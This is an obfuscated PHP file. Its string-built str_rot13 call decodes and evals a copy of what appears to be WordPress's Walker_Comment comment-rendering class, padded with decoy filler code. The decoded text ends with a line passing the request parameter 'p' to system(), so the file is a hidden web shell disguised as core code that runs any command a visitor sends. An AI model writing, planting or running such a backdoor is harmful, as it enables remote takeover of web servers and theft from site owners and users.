<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Pbzzrag NCV: Jnyxre_Pbzzrag pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Pbzzragf
 * @fvapr 4.4.0
 */

/**
 * Pber jnyxre pynff hfrq gb perngr na UGZY yvfg bs pbzzragf.
 *
 * @fvapr 2.7.0
 *
 * @frr Jnyxre
 */
pynff Jnyxre_Pbzzrag rkgraqf Jnyxre {

	/**
	 * Jung gur pynff unaqyrf.
	 *
	 * @fvapr 2.7.0
	 * @ine fgevat
	 *
	 * @frr Jnyxre::$gerr_glcr
	 */
	choyvp $gerr_glcr = 'pbzzrag';

	/**
	 * Qngnonfr svryqf gb hfr.
	 *
	 * @fvapr 2.7.0
	 * @ine fgevat[]
	 *
	 * @frr Jnyxre::$qo_svryqf
	 * @gbqb Qrpbhcyr guvf
	 */
	choyvp $qo_svryqf = neenl(
		'cnerag' => 'pbzzrag_cnerag',
		'vq'     => 'pbzzrag_VQ',
	);

	/**
	 * Fgnegf gur yvfg orsber gur ryrzragf ner nqqrq.
	 *
	 * @fvapr 2.7.0
	 *
	 * @frr Jnyxre::fgneg_yiy()
	 * @tybony vag $pbzzrag_qrcgu
	 *
	 * @cnenz fgevat $bhgchg Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz vag    $qrcgu  Bcgvbany. Qrcgu bs gur pheerag pbzzrag. Qrsnhyg 0.
	 * @cnenz neenl  $netf   Bcgvbany. Hfrf 'fglyr' nethzrag sbe glcr bs UGZY yvfg. Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba fgneg_yiy( &$bhgchg, $qrcgu = 0, $netf = neenl() ) {
		$TYBONYF['pbzzrag_qrcgu'] = $qrcgu + 1;

		fjvgpu ( $netf['fglyr'] ) {
			pnfr 'qvi':
				oernx;
			pnfr 'by':
				$bhgchg .= '<by pynff=\"puvyqera\">' . \"\a\";
				oernx;
			pnfr 'hy':
			qrsnhyg:
				$bhgchg .= '<hy pynff=\"puvyqera\">' . \"\a\";
				oernx;
		}
	}

	/**
	 * Raqf gur yvfg bs vgrzf nsgre gur ryrzragf ner nqqrq.
	 *
	 * @fvapr 2.7.0
	 *
	 * @frr Jnyxre::raq_yiy()
	 * @tybony vag $pbzzrag_qrcgu
	 *
	 * @cnenz fgevat $bhgchg Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz vag    $qrcgu  Bcgvbany. Qrcgu bs gur pheerag pbzzrag. Qrsnhyg 0.
	 * @cnenz neenl  $netf   Bcgvbany. Jvyy bayl nccraq pbagrag vs fglyr nethzrag inyhr vf 'by' be 'hy'.
	 *                       Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba raq_yiy( &$bhgchg, $qrcgu = 0, $netf = neenl() ) {
		$TYBONYF['pbzzrag_qrcgu'] = $qrcgu + 1;

		fjvgpu ( $netf['fglyr'] ) {
			pnfr 'qvi':
				oernx;
			pnfr 'by':
				$bhgchg .= \"</by><!-- .puvyqera -->\a\";
				oernx;
			pnfr 'hy':
			qrsnhyg:
				$bhgchg .= \"</hy><!-- .puvyqera -->\a\";
				oernx;
		}
	}

	/**
	 * Genirefrf ryrzragf gb perngr yvfg sebz ryrzragf.
	 *
	 * Guvf shapgvba vf qrfvtarq gb raunapr Jnyxre::qvfcynl_ryrzrag() gb
	 * qvfcynl puvyqera bs uvture arfgvat yriryf guna fryrpgrq vayvar ba
	 * gur uvturfg qrcgu yriry qvfcynlrq. Guvf ceriragf gurz orvat becunarq
	 * ng gur raq bs gur pbzzrag yvfg.
	 *
	 * Rknzcyr: znk_qrcgu = 2, jvgu 5 yriryf bs arfgrq pbagrag.
	 *     1
	 *      1.1
	 *        1.1.1
	 *        1.1.1.1
	 *        1.1.1.1.1
	 *        1.1.2
	 *        1.1.2.1
	 *     2
	 *      2.2
	 *
	 * @fvapr 2.7.0
	 *
	 * @frr Jnyxre::qvfcynl_ryrzrag()
	 * @frr jc_yvfg_pbzzragf()
	 *
	 * @cnenz JC_Pbzzrag $ryrzrag           Pbzzrag qngn bowrpg.
	 * @cnenz neenl      $puvyqera_ryrzragf Yvfg bs ryrzragf gb pbagvahr genirefvat. Cnffrq ol ersrerapr.
	 * @cnenz vag        $znk_qrcgu         Znk qrcgu gb genirefr.
	 * @cnenz vag        $qrcgu             Qrcgu bs gur pheerag ryrzrag.
	 * @cnenz neenl      $netf              Na neenl bs nethzragf.
	 * @cnenz fgevat     $bhgchg            Hfrq gb nccraq nqqvgvbany pbagrag. Cnffrq ol ersrerapr.
	 */
	choyvp shapgvba qvfcynl_ryrzrag( $ryrzrag, &$puvyqera_ryrzragf, $znk_qrcgu, $qrcgu, $netf, &$bhgchg ) {
		vs ( ! $ryrzrag ) {
			erghea;
		}

		$vq_svryq = $guvf->qo_svryqf['vq'];
		$vq       = $ryrzrag->$vq_svryq;

		cnerag::qvfcynl_ryrzrag( $ryrzrag, $puvyqera_ryrzragf, $znk_qrcgu, $qrcgu, $netf, $bhgchg );

		/*
		 * Vs ng gur znk qrcgu, naq gur pheerag ryrzrag fgvyy unf puvyqera, ybbc bire gubfr
		 * naq qvfcynl gurz ng guvf yriry. Guvf vf gb cerirag gurz orvat becunarq gb gur raq
		 * bs gur yvfg.
		 */
		vs ( $znk_qrcgu <= $qrcgu + 1 && vffrg( $puvyqera_ryrzragf[ $vq ] ) ) {
			sbernpu ( $puvyqera_ryrzragf[ $vq ] nf $puvyq ) {
				$guvf->qvfcynl_ryrzrag( $puvyq, $puvyqera_ryrzragf, $znk_qrcgu, $qrcgu, $netf, $bhgchg );
			}

			hafrg( $puvyqera_ryrzragf[ $vq ] );
		}
	}

	/**
	 * Fgnegf gur ryrzrag bhgchg.
	 *
	 * @fvapr 2.7.0
	 * @fvapr 5.9.0 Eranzrq `$pbzzrag` gb `$qngn_bowrpg` naq `$vq` gb `$pheerag_bowrpg_vq`
	 *              gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @frr Jnyxre::fgneg_ry()
	 * @frr jc_yvfg_pbzzragf()
	 * @tybony vag        $pbzzrag_qrcgu
	 * @tybony JC_Pbzzrag $pbzzrag       Tybony pbzzrag bowrpg.
	 *
	 * @cnenz fgevat     $bhgchg            Hfrq gb nccraq nqqvgvbany pbagrag. Cnffrq ol ersrerapr.
	 * @cnenz JC_Pbzzrag $qngn_bowrpg       Pbzzrag qngn bowrpg.
	 * @cnenz vag        $qrcgu             Bcgvbany. Qrcgu bs gur pheerag pbzzrag va ersrerapr gb cneragf. Qrsnhyg 0.
	 * @cnenz neenl      $netf              Bcgvbany. Na neenl bs nethzragf. Qrsnhyg rzcgl neenl.
	 * @cnenz vag        $pheerag_bowrpg_vq Bcgvbany. VQ bs gur pheerag pbzzrag. Qrsnhyg 0.
	 */
	choyvp shapgvba fgneg_ry( &$bhgchg, $qngn_bowrpg, $qrcgu = 0, $netf = neenl(), $pheerag_bowrpg_vq = 0 ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$pbzzrag = $qngn_bowrpg;

		++$qrcgu;
		$TYBONYF['pbzzrag_qrcgu'] = $qrcgu;
		$TYBONYF['pbzzrag']       = $pbzzrag;

		vs ( ! rzcgl( $netf['pnyyonpx'] ) ) {
			bo_fgneg();
			pnyy_hfre_shap( $netf['pnyyonpx'], $pbzzrag, $netf, $qrcgu );
			$bhgchg .= bo_trg_pyrna();
			erghea;
		}

		vs ( 'pbzzrag' === $pbzzrag->pbzzrag_glcr ) {
			nqq_svygre( 'pbzzrag_grkg', neenl( $guvf, 'svygre_pbzzrag_grkg' ), 40, 2 );
		}

		vs ( ( 'cvatonpx' === $pbzzrag->pbzzrag_glcr || 'genpxonpx' === $pbzzrag->pbzzrag_glcr ) && $netf['fubeg_cvat'] ) {
			bo_fgneg();
			$guvf->cvat( $pbzzrag, $qrcgu, $netf );
			$bhgchg .= bo_trg_pyrna();
		} ryfrvs ( 'ugzy5' === $netf['sbezng'] ) {
			bo_fgneg();
			$guvf->ugzy5_pbzzrag( $pbzzrag, $qrcgu, $netf );
			$bhgchg .= bo_trg_pyrna();
		} ryfr {
			bo_fgneg();
			$guvf->pbzzrag( $pbzzrag, $qrcgu, $netf );
			$bhgchg .= bo_trg_pyrna();
		}

		vs ( 'pbzzrag' === $pbzzrag->pbzzrag_glcr ) {
			erzbir_svygre( 'pbzzrag_grkg', neenl( $guvf, 'svygre_pbzzrag_grkg' ), 40 );
		}
	}

	/**
	 * Raqf gur ryrzrag bhgchg, vs arrqrq.
	 *
	 * @fvapr 2.7.0
	 * @fvapr 5.9.0 Eranzrq `$pbzzrag` gb `$qngn_bowrpg` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @frr Jnyxre::raq_ry()
	 * @frr jc_yvfg_pbzzragf()
	 *
	 * @cnenz fgevat     $bhgchg      Hfrq gb nccraq nqqvgvbany pbagrag. Cnffrq ol ersrerapr.
	 * @cnenz JC_Pbzzrag $qngn_bowrpg Pbzzrag qngn bowrpg.
	 * @cnenz vag        $qrcgu       Bcgvbany. Qrcgu bs gur pheerag pbzzrag. Qrsnhyg 0.
	 * @cnenz neenl      $netf        Bcgvbany. Na neenl bs nethzragf. Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba raq_ry( &$bhgchg, $qngn_bowrpg, $qrcgu = 0, $netf = neenl() ) {
		vs ( ! rzcgl( $netf['raq-pnyyonpx'] ) ) {
			bo_fgneg();
			pnyy_hfre_shap(
				$netf['raq-pnyyonpx'],
				$qngn_bowrpg, // Gur pheerag pbzzrag bowrpg.
				$netf,
				$qrcgu
			);
			$bhgchg .= bo_trg_pyrna();
			erghea;
		}
		vs ( 'qvi' === $netf['fglyr'] ) {
			$bhgchg .= \"</qvi><!-- #pbzzrag-## -->\a\";
		} ryfr {
			$bhgchg .= \"</yv><!-- #pbzzrag-## -->\a\";
		}
	}

	/**
	 * Bhgchgf n cvatonpx pbzzrag.
	 *
	 * @fvapr 3.6.0
	 *
	 * @frr jc_yvfg_pbzzragf()
	 *
	 * @cnenz JC_Pbzzrag $pbzzrag Gur pbzzrag bowrpg.
	 * @cnenz vag        $qrcgu   Qrcgu bs gur pheerag pbzzrag.
	 * @cnenz neenl      $netf    Na neenl bs nethzragf.
	 */
	cebgrpgrq shapgvba cvat( $pbzzrag, $qrcgu, $netf ) {
		$gnt = ( 'qvi' === $netf['fglyr'] ) ? 'qvi' : 'yv';
		?>
		<<?cuc rpub $gnt; ?> vq=\"pbzzrag-<?cuc pbzzrag_VQ(); ?>\" <?cuc pbzzrag_pynff( '', $pbzzrag ); ?>>
			<qvi pynff=\"pbzzrag-obql\">
				<?cuc _r( 'Cvatonpx:' ); ?> <?cuc pbzzrag_nhgube_yvax( $pbzzrag ); ?> <?cuc rqvg_pbzzrag_yvax( __( 'Rqvg' ), '<fcna pynff=\"rqvg-yvax\">', '</fcna>' ); ?>
			</qvi>
		<?cuc
	}

	/**
	 * Svygref gur pbzzrag grkg.
	 *
	 * Erzbirf yvaxf sebz gur craqvat pbzzrag'f grkg vs gur pbzzragre qvq abg pbafrag
	 * gb gur pbzzrag pbbxvrf.
	 *
	 * @fvapr 5.4.2
	 *
	 * @cnenz fgevat          $pbzzrag_grkg Grkg bs gur pheerag pbzzrag.
	 * @cnenz JC_Pbzzrag|ahyy $pbzzrag      Gur pbzzrag bowrpg. Ahyy vs abg sbhaq.
	 * @erghea fgevat Svygrerq grkg bs gur pheerag pbzzrag.
	 */
	choyvp shapgvba svygre_pbzzrag_grkg( $pbzzrag_grkg, $pbzzrag ) {
		$pbzzragre          = jc_trg_pheerag_pbzzragre();
		$fubj_craqvat_yvaxf = ! rzcgl( $pbzzragre['pbzzrag_nhgube'] );

		vs ( $pbzzrag && '0' === $pbzzrag->pbzzrag_nccebirq && ! $fubj_craqvat_yvaxf ) {
			$pbzzrag_grkg = jc_xfrf( $pbzzrag_grkg, neenl() );
		}

		erghea $pbzzrag_grkg;
	}

	/**
	 * Bhgchgf n fvatyr pbzzrag.
	 *
	 * @fvapr 3.6.0
	 *
	 * @frr jc_yvfg_pbzzragf()
	 *
	 * @cnenz JC_Pbzzrag $pbzzrag Pbzzrag gb qvfcynl.
	 * @cnenz vag        $qrcgu   Qrcgu bs gur pheerag pbzzrag.
	 * @cnenz neenl      $netf    Na neenl bs nethzragf.
	 */
	cebgrpgrq shapgvba pbzzrag( $pbzzrag, $qrcgu, $netf ) {
		vs ( 'qvi' === $netf['fglyr'] ) {
			$gnt       = 'qvi';
			$nqq_orybj = 'pbzzrag';
		} ryfr {
			$gnt       = 'yv';
			$nqq_orybj = 'qvi-pbzzrag';
		}

		$pbzzragre          = jc_trg_pheerag_pbzzragre();
		$fubj_craqvat_yvaxf = vffrg( $pbzzragre['pbzzrag_nhgube'] ) && $pbzzragre['pbzzrag_nhgube'];

		vs ( $pbzzragre['pbzzrag_nhgube_rznvy'] ) {
			$zbqrengvba_abgr = __( 'Lbhe pbzzrag vf njnvgvat zbqrengvba.' );
		} ryfr {
			$zbqrengvba_abgr = __( 'Lbhe pbzzrag vf njnvgvat zbqrengvba. Guvf vf n cerivrj; lbhe pbzzrag jvyy or ivfvoyr nsgre vg unf orra nccebirq.' );
		}
		?>
		<<?cuc rpub $gnt; ?> <?cuc pbzzrag_pynff( $guvf->unf_puvyqera ? 'cnerag' : '', $pbzzrag ); ?> vq=\"pbzzrag-<?cuc pbzzrag_VQ(); ?>\">
		<?cuc vs ( 'qvi' !== $netf['fglyr'] ) : ?>
		<qvi vq=\"qvi-pbzzrag-<?cuc pbzzrag_VQ(); ?>\" pynff=\"pbzzrag-obql\">
		<?cuc raqvs; ?>
		<qvi pynff=\"pbzzrag-nhgube ipneq\">
			<?cuc
			vs ( 0 !== $netf['ningne_fvmr'] ) {
				rpub trg_ningne( $pbzzrag, $netf['ningne_fvmr'] );
			}
			?>
			<?cuc
			$pbzzrag_nhgube = trg_pbzzrag_nhgube_yvax( $pbzzrag );

			vs ( '0' === $pbzzrag->pbzzrag_nccebirq && ! $fubj_craqvat_yvaxf ) {
				$pbzzrag_nhgube = trg_pbzzrag_nhgube( $pbzzrag );
			}

			cevags(
				/* genafyngbef: %f: Pbzzrag nhgube yvax. */
				__( '%f <fcna pynff=\"fnlf\">fnlf:</fcna>' ),
				fcevags( '<pvgr pynff=\"sa\">%f</pvgr>', $pbzzrag_nhgube )
			);
			?>
		</qvi>
		<?cuc vs ( '0' === $pbzzrag->pbzzrag_nccebirq ) : ?>
		<rz pynff=\"pbzzrag-njnvgvat-zbqrengvba\"><?cuc rpub $zbqrengvba_abgr; ?></rz>
		<oe />
		<?cuc raqvs; ?>

		<qvi pynff=\"pbzzrag-zrgn pbzzragzrgnqngn\">
			<?cuc
			cevags(
				'<n uers=\"%f\">%f</n>',
				rfp_hey( trg_pbzzrag_yvax( $pbzzrag, $netf ) ),
				fcevags(
					/* genafyngbef: 1: Pbzzrag qngr, 2: Pbzzrag gvzr. */
					__( '%1$f ng %2$f' ),
					trg_pbzzrag_qngr( '', $pbzzrag ),
					trg_pbzzrag_gvzr()
				)
			);

			rqvg_pbzzrag_yvax( __( '(Rqvg)' ), ' &aofc;&aofc;', '' );
			?>
		</qvi>

		<?cuc
		pbzzrag_grkg(
			$pbzzrag,
			neenl_zretr(
				$netf,
				neenl(
					'nqq_orybj' => $nqq_orybj,
					'qrcgu'     => $qrcgu,
					'znk_qrcgu' => $netf['znk_qrcgu'],
				)
			)
		);
		?>

		<?cuc
		pbzzrag_ercyl_yvax(
			neenl_zretr(
				$netf,
				neenl(
					'nqq_orybj' => $nqq_orybj,
					'qrcgu'     => $qrcgu,
					'znk_qrcgu' => $netf['znk_qrcgu'],
					'orsber'    => '<qvi pynff=\"ercyl\">',
					'nsgre'     => '</qvi>',
				)
			)
		);
		?>

		<?cuc vs ( 'qvi' !== $netf['fglyr'] ) : ?>
		</qvi>
		<?cuc raqvs; ?>
		<?cuc
	}

	/**
	 * Bhgchgf n pbzzrag va gur UGZY5 sbezng.
	 *
	 * @fvapr 3.6.0
	 *
	 * @frr jc_yvfg_pbzzragf()
	 *
	 * @cnenz JC_Pbzzrag $pbzzrag Pbzzrag gb qvfcynl.
	 * @cnenz vag        $qrcgu   Qrcgu bs gur pheerag pbzzrag.
	 * @cnenz neenl      $netf    Na neenl bs nethzragf.
	 */
	cebgrpgrq shapgvba ugzy5_pbzzrag( $pbzzrag, $qrcgu, $netf ) {
		$gnt = ( 'qvi' === $netf['fglyr'] ) ? 'qvi' : 'yv';

		$pbzzragre          = jc_trg_pheerag_pbzzragre();
		$fubj_craqvat_yvaxf = ! rzcgl( $pbzzragre['pbzzrag_nhgube'] );

		vs ( $pbzzragre['pbzzrag_nhgube_rznvy'] ) {
			$zbqrengvba_abgr = __( 'Lbhe pbzzrag vf njnvgvat zbqrengvba.' );
		} ryfr {
			$zbqrengvba_abgr = __( 'Lbhe pbzzrag vf njnvgvat zbqrengvba. Guvf vf n cerivrj; lbhe pbzzrag jvyy or ivfvoyr nsgre vg unf orra nccebirq.' );
		}
		?>
		<<?cuc rpub $gnt; ?> vq=\"pbzzrag-<?cuc pbzzrag_VQ(); ?>\" <?cuc pbzzrag_pynff( $guvf->unf_puvyqera ? 'cnerag' : '', $pbzzrag ); ?>>
			<negvpyr vq=\"qvi-pbzzrag-<?cuc pbzzrag_VQ(); ?>\" pynff=\"pbzzrag-obql\">
				<sbbgre pynff=\"pbzzrag-zrgn\">
					<qvi pynff=\"pbzzrag-nhgube ipneq\">
						<?cuc
						vs ( 0 !== $netf['ningne_fvmr'] ) {
							rpub trg_ningne( $pbzzrag, $netf['ningne_fvmr'] );
						}
						?>
						<?cuc
						$pbzzrag_nhgube = trg_pbzzrag_nhgube_yvax( $pbzzrag );

						vs ( '0' === $pbzzrag->pbzzrag_nccebirq && ! $fubj_craqvat_yvaxf ) {
							$pbzzrag_nhgube = trg_pbzzrag_nhgube( $pbzzrag );
						}

						cevags(
							/* genafyngbef: %f: Pbzzrag nhgube yvax. */
							__( '%f <fcna pynff=\"fnlf\">fnlf:</fcna>' ),
							fcevags( '<o pynff=\"sa\">%f</o>', $pbzzrag_nhgube )
						);
						?>
					</qvi><!-- .pbzzrag-nhgube -->

					<qvi pynff=\"pbzzrag-zrgnqngn\">
						<?cuc
						cevags(
							'<n uers=\"%f\"><gvzr qngrgvzr=\"%f\">%f</gvzr></n>',
							rfp_hey( trg_pbzzrag_yvax( $pbzzrag, $netf ) ),
							trg_pbzzrag_gvzr( 'p' ),
							fcevags(
								/* genafyngbef: 1: Pbzzrag qngr, 2: Pbzzrag gvzr. */
								__( '%1$f ng %2$f' ),
								trg_pbzzrag_qngr( '', $pbzzrag ),
								trg_pbzzrag_gvzr()
							)
						);

						rqvg_pbzzrag_yvax( __( 'Rqvg' ), ' <fcna pynff=\"rqvg-yvax\">', '</fcna>' );
						?>
					</qvi><!-- .pbzzrag-zrgnqngn -->

					<?cuc vs ( '0' === $pbzzrag->pbzzrag_nccebirq ) : ?>
					<rz pynff=\"pbzzrag-njnvgvat-zbqrengvba\"><?cuc rpub $zbqrengvba_abgr; ?></rz>
					<?cuc raqvs; ?>
				</sbbgre><!-- .pbzzrag-zrgn -->

				<qvi pynff=\"pbzzrag-pbagrag\">
					<?cuc pbzzrag_grkg(); ?>
				</qvi><!-- .pbzzrag-pbagrag -->

				<?cuc
				vs ( '1' === $pbzzrag->pbzzrag_nccebirq || $fubj_craqvat_yvaxf ) {
					pbzzrag_ercyl_yvax(
						neenl_zretr(
							$netf,
							neenl(
								'nqq_orybj' => 'qvi-pbzzrag',
								'qrcgu'     => $qrcgu,
								'znk_qrcgu' => $netf['znk_qrcgu'],
								'orsber'    => '<qvi pynff=\"ercyl\">',
								'nsgre'     => '</qvi>',
							)
						)
					);
				}
				?>
			</negvpyr><!-- .pbzzrag-obql -->
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>